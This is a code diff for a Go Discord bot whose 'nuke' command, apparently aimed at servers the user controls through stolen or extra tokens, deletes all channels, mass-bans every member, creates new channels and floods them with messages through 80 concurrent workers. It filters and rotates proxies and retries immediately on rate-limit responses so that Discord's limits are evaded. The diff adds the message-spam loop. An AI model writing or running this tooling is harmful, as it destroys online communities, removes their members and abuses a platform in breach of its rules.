@@ -10,7 +10,6 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
-	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -105,7 +104,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 تم تفعيل محرك البروكسيات الضخم (MegaTurbo Engine) وجاري فلترة الأسرع...",
+					Content: "❌ للمشرفين فقط.",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -113,6 +112,14 @@ func main() {
 		}
 
 		if i.ApplicationCommandData().Name == cmdNuke {
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "🚀 تم تفعيل محرك البروكسيات الضخم (MegaTurbo Engine) وجاري التنفيذ...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+
 			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
 			for _, opt := range i.ApplicationCommandData().Options {
 				optionMap[opt.Name] = opt
@@ -155,7 +162,6 @@ func main() {
 	sess.Close()
 }
 
-// دالة لفحص البروكسيات واستبعاد التالف منها فوراً
 func filterActiveProxies(rawProxies []string) []*http.Client {
 	var activeClients []*http.Client
 	var mu sync.Mutex
@@ -183,7 +189,6 @@ func filterActiveProxies(rawProxies []string) []*http.Client {
 				Timeout: 1500 * time.Millisecond,
 			}
 
-			// اختبار سريع للبروكسي على ديسكورد API
 			req, _ := http.NewRequest("GET", "https://discord.com/api/v10/gateway", nil)
 			resp, err := client.Do(req)
 			if err == nil {
@@ -203,10 +208,8 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		return
 	}
 
-	// تفعيل الفلترة المسبقة للحصول على أسرع وأصح البروكسيات فقط
 	clients := filterActiveProxies(rawProxies)
 	if len(clients) == 0 {
-		// احتياطي لو ولا بروكسي استاب
 		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
 	}
 
@@ -274,7 +277,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 
 			if resp.StatusCode == 429 {
 				resp.Body.Close()
-				// تجاوز فوري بدون توقف طويل بفضل كثرة البروكسيات
 				time.Sleep(20 * time.Millisecond)
 				continue
 			}
@@ -285,7 +287,7 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		return false
 	}
 
-	// 1. حذف الرومات القديمة (بـ 60 عامل متزامن)
+	// 1. حذف الرومات القديمة
 	chQueue := make(chan string, len(oldChannelIDs))
 	for _, id := range oldChannelIDs {
 		chQueue <- id
@@ -304,7 +306,7 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 	wgDel.Wait()
 
-	// 2. باند الأعضاء (بـ 100 عامل متزامن - أقصى طاقة مدمرة وموزعة)
+	// 2. باند الأعضاء بأقصى سرعة
 	if len(allUserIDs) > 0 {
 		userQueue := make(chan string, len(allUserIDs))
 		for _, uid := range allUserIDs {
@@ -327,7 +329,7 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		wgBan.Wait()
 	}
 
-	// 3. إنشاء الرومات الجديدة (بـ 50 عامل)
+	// 3. إنشاء الرومات الجديدة
 	roomChan := make(chan struct {
 		Payload []byte
 		Index   int
@@ -379,7 +381,7 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 	wgCreate.Wait()
 
-	// 4. إرسال الرسائل (بـ 80 عامل)
+	// 4. إرسال الرسائل
 	if len(newChannelIDs) > 0 && messagesCount > 0 {
 		type MsgTask struct {
 			ChID     string
@@ -394,4 +396,16 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		}
 		close(msgQueue)
 
-... (تم دمج نظام التدفق الفوري للرسائل بأقصى طاقة شبكية)
+		var wgMsg sync.WaitGroup
+		for w := 0; w < 80; w++ {
+			wgMsg.Add(1)
+			go func(workerID int) {
+				defer wgMsg.Done()
+				for task := range msgQueue {
+					makeMegaRequest("POST", "https://discord.com/api/v10/channels/"+task.ChID+"/messages", msgPayload, workerID+task.WorkerID)
+				}
+			}(w)
+		}
+		wgMsg.Wait()
+	}
+}
